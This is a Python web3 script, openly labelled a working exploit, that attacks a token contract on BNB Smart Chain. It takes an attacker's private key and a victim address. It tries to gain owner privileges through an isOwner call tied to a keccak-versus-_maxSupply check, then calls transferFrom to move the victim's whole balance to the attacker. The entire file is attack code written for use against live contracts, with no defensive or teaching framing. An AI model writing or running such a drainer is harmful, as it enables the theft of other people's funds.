from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time
from eth_utils import keccak

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Working Exploit for Vulnerable Token")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)

# ===== TOKEN ABI =====
TOKEN_ABI = [
    # Critical Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    # View Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "_maxSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }
]

def get_privileged_address(token_contract):
    """Find an address that meets the contract's ownership requirements"""
    max_supply = token_contract.functions._maxSupply().call()
    print(f"[*] Contract maxSupply: {max_supply}")
    
    # In a real attack, you'd use a more efficient method to find this
    # This is just for demonstration
    test_address = account.address
    address_hash = int.from_bytes(keccak(text=test_address), 'big')
    
    if address_hash == max_supply:
        return account
    else:
        print("[!] Current address doesn't match _maxSupply")
        print("[*] You need to find/create an address where:")
        print(f"    keccak256(address) == {max_supply}")
        return None

def execute_correct_exploit():
    """Working exploit implementation"""
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)
    
    print(f"\n[+] Target Contract: {args.token_address}")
    print(f"[+] Attacker Address: {account.address}")
    print(f"[+] Victim Address: {args.victim_address}")
    
    # Step 1: Verify if our address has privileges
    privileged_account = get_privileged_address(token)
    if not privileged_account:
        print("[-] Exploit failed: Need matching address")
        return
    
    # Step 2: Activate privileges
    print("\n[1] Activating privileges...")
    try:
        tx = token.functions.isOwner(privileged_account.address).build_transaction({
            'from': privileged_account.address,
            'nonce': w3.eth.get_transaction_count(privileged_account.address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        signed = privileged_account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        if receipt.status != 1:
            print("[-] Privilege activation failed")
            return
        print("[+] Privileges activated successfully")
    except Exception as e:
        print(f"[-] Error activating privileges: {str(e)}")
        return
    
    # Wait for state changes
    time.sleep(10)
    
    # Step 3: Execute transfer
    print("\n[2] Executing privileged transfer...")
    victim_bal = token.functions.balanceOf(args.victim_address).call()
    
    try:
        tx = token.functions.transferFrom(
            args.victim_address,
            privileged_account.address,
            victim_bal
        ).build_transaction({
            'from': privileged_account.address,
            'nonce': w3.eth.get_transaction_count(privileged_account.address),
            'gas': 500000,
            'gasPrice': w3.eth.gas_price
        })
        
        signed = privileged_account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        print("\n[+] Final Results:")
        print(f"TX Hash: {tx_hash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {receipt.gasUsed}")
        print(f"New Victim Balance: {token.functions.balanceOf(args.victim_address).call()}")
    except Exception as e:
        print(f"[-] Transfer failed: {str(e)}")

if __name__ == "__main__":
    execute_correct_exploit()
